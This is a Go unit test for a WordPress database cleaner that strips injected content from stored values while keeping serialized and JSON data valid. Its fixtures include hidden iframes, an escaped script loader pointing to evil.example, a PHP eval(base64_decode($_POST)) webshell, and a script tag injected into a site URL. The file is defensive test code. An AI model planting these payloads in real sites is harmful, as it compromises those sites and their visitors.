package cms

import (
	"encoding/json"
	"fmt"
	"strings"
	"testing"
)

// The cleaner cuts out exactly what the scanner reports and keeps the rest
// of the row; serialized PHP data and JSON stay readable for WordPress.
func TestCleanStoredValue(t *testing.T) {
	frame := `<iframe style="position: absolute; height: 1px,width:1px; visibility: hidden;" src="//traffic.example/public"></iframe>`
	sized := `<iframe width="0" height="0" src="https://traffic.example/in.php"></iframe>`
	post := "<h3>About us</h3>\n" + frame + "\n<p>We insure.</p>"
	got, err := CleanStoredValue(post)
	if err != nil || got != "<h3>About us</h3>\n\n<p>We insure.</p>" {
		t.Fatalf("post: %q %v", got, err)
	}
	// A WordPress embed and a Jetpack frame next to the injection stay.
	embed := `<iframe class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="position: absolute; visibility: hidden;" src="https://news.example/?p=1&amp;embed=true#?secret=a" data-secret="a"></iframe>`
	if got, _ := CleanStoredValue(embed + frame); got != embed {
		t.Fatalf("embed removed: %q", got)
	}
	// An escaped script injection.
	js := `<p>x</p><script>document.write(unescape('%3C%73%63%72%69%70%74%20%73%72%63%3D%22%2F%2F%65%76%69%6C%2E%65%78%61%6D%70%6C%65%2F%22%3E%3C%2F%73%63%72%69%70%74%3E'));</script><p>y</p>`
	if got, err := CleanStoredValue(js); err != nil || got != "<p>x</p><p>y</p>" {
		t.Fatalf("script: %q %v", got, err)
	}
	// A PHP payload stored as an option: emptied.
	payload := "<?php eval(base64_decode($_POST['x'])); ?>"
	if ScanValueDetail(payload).Signature == "" {
		t.Fatal("fixture not reported")
	}
	if got, err := CleanStoredValue(payload); err != nil || strings.TrimSpace(got) != "" {
		t.Fatalf("payload: %q %v", got, err)
	}
	// Serialized option: the payload string is emptied, lengths follow.
	ser := fmt.Sprintf(`a:3:{s:4:"hash";s:6:"abc123";s:7:"payload";s:%d:"%s";s:5:"count";i:2;}`, len(payload), payload)
	got, err = CleanStoredValue(ser)
	if err != nil || got != `a:3:{s:4:"hash";s:6:"abc123";s:7:"payload";s:0:"";s:5:"count";i:2;}` {
		t.Fatalf("serialized: %q %v", got, err)
	}
	// A widget (serialized inside serialized) with an injected frame.
	text := "<p>Hi</p>" + frame
	inner := fmt.Sprintf(`a:1:{s:4:"text";s:%d:"%s";}`, len(text), text)
	outer := fmt.Sprintf(`a:2:{i:2;s:%d:"%s";s:12:"_multiwidget";i:1;}`, len(inner), inner)
	got, err = CleanStoredValue(outer)
	if err != nil || !strings.Contains(got, `s:4:"text";s:9:"<p>Hi</p>";`) {
		t.Fatalf("nested: %q %v", got, err)
	}
	if v, rest, err := unserialize(got); err != nil || rest != "" || v.serialize() != got {
		t.Fatalf("nested result not valid: %v", err)
	}
	// Page builder JSON: the frame goes, the JSON stays valid.
	var buf strings.Builder
	enc := json.NewEncoder(&buf)
	enc.SetEscapeHTML(false)
	enc.Encode([]map[string]any{{"id": "3", "settings": map[string]string{"html": "<p>a</p>" + sized}}})
	doc := strings.TrimSpace(buf.String())
	if ScanValueDetail(doc).Signature == "" {
		t.Fatal("frame in builder JSON not reported")
	}
	got, err = CleanStoredValue(doc)
	if err != nil || !json.Valid([]byte(got)) || strings.Contains(got, "traffic.example") {
		t.Fatalf("json: %q %v", got, err)
	}
	// Nothing reported: unchanged.
	if got, _ := CleanStoredValue("<p>plain</p>"); got != "<p>plain</p>" {
		t.Fatal("clean value changed")
	}
	// Site address.
	if got, err := cleanSiteURL(`https://shop.example"><script src=//evil.example/x.js></script>`); err != nil || got != "https://shop.example" {
		t.Fatalf("siteurl: %q %v", got, err)
	}
	if _, err := cleanSiteURL(`<script>x</script>`); err == nil {
		t.Fatal("unrecoverable site address accepted")
	}
	// Only the site's own tables and columns.
	r := cleanRow{table: "wp_users", keyCol: "ID"}
	if r.target("wp_") == nil {
		t.Fatal("users table accepted")
	}
	r = cleanRow{table: "wp_options", keyCol: "option_name", col: "option_value"}
	if r.target("wp_") != nil || r.target("other_") == nil {
		t.Fatal("options table check")
	}
}
